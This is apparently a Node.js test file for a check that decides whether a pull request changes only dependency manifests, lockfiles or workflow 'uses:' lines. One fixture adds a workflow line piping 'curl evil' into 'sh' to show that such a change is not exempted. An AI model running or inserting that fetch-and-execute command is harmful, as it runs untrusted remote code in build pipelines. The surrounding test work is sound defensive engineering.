import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isDependencyOnlyChange, FILES_API_CAP } from './dependency-only.mjs';

const f = (filename, extra = {}) => ({ filename, status: 'modified', ...extra });
const usesPatch = '@@ -10,7 +10,7 @@\n context\n-      - uses: actions/checkout@v6\n+      - uses: actions/checkout@v7\n context';

test('manifest and lockfile bump is dependency-only', () => {
  assert.equal(isDependencyOnlyChange([f('package.json'), f('yarn.lock')]).dependencyOnly, true);
});

test('pin workflow commit (package.json + yarn.lock) stays exempt', () => {
  assert.equal(isDependencyOnlyChange([f('package.json'), f('yarn.lock')]).dependencyOnly, true);
});

test('nested manifests and .NET files qualify', () => {
  const files = ['src/app/package.json', 'pnpm-lock.yaml', 'npm-shrinkwrap.json', 'package-lock.json',
    'src/A/A.csproj', 'Directory.Packages.props', 'Directory.Build.props', 'src/packages.lock.json', 'global.json'].map((n) => f(n));
  assert.equal(isDependencyOnlyChange(files).dependencyOnly, true);
});

test('a source file makes it not dependency-only and is named', () => {
  const r = isDependencyOnlyChange([f('package.json'), f('src/index.ts')]);
  assert.deepEqual(r, { dependencyOnly: false, offending: 'src/index.ts' });
});

test('lookalike names do not qualify', () => {
  assert.equal(isDependencyOnlyChange([f('package.json.sh')]).dependencyOnly, false);
  assert.equal(isDependencyOnlyChange([f('scripts/yarn.lock.js')]).dependencyOnly, false);
});

test('workflow with only uses: lines changed qualifies', () => {
  assert.equal(isDependencyOnlyChange([f('.github/workflows/ci.yml', { patch: usesPatch })]).dependencyOnly, true);
});

test('workflow with any other changed line does not', () => {
  const patch = usesPatch + '\n+      run: curl evil | sh';
  assert.equal(isDependencyOnlyChange([f('.github/workflows/ci.yml', { patch })]).dependencyOnly, false);
});

test('workflow without a patch (large file) does not', () => {
  assert.equal(isDependencyOnlyChange([f('.github/workflows/ci.yml')]).dependencyOnly, false);
});

test('added workflow, renamed file and other .github files do not', () => {
  assert.equal(isDependencyOnlyChange([f('.github/workflows/new.yml', { status: 'added', patch: usesPatch })]).dependencyOnly, false);
  assert.equal(isDependencyOnlyChange([f('package.json', { status: 'renamed', previous_filename: 'x/y.js' })]).dependencyOnly, false);
  assert.equal(isDependencyOnlyChange([f('.github/actions/a/action.yml', { patch: usesPatch })]).dependencyOnly, false);
});

test('empty or possibly truncated listings never exempt', () => {
  assert.equal(isDependencyOnlyChange([]).dependencyOnly, false);
  const many = Array.from({ length: FILES_API_CAP }, (_, i) => f(`d${i}/package.json`));
  assert.equal(isDependencyOnlyChange(many).dependencyOnly, false);
});
